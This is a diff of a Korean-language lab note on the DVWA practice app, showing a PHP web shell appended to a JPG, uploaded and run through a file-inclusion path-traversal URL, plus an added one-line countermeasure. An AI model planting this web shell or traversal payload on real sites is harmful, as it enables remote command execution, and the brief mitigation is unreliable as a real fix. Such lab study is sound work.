@@ -157,7 +157,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {    // Where are we going to�
   3. 해당 jpg 파일을 upload
   4. File Inclusion에서 아래 명령어 url 입력 시 cmd 실행되는 점 확인
 
-```
+```php
 echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
 
 -- URL Upload 폴더에 접근 및 실행
@@ -168,3 +168,8 @@ dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id
 **실행 결과**
 
 ![](../Images/Pasted%20image%2020260803143219.png)
+
+
+> 위 공격 대응 방안으로 upload되는 이미지 자체를 new Image() 생성자로 호출하여 악성 코드가 내재된 이미지를 쓰지 않는 방식으로 대처 가능
+
+![](../Images/Pasted%20image%2020260803145323.png)
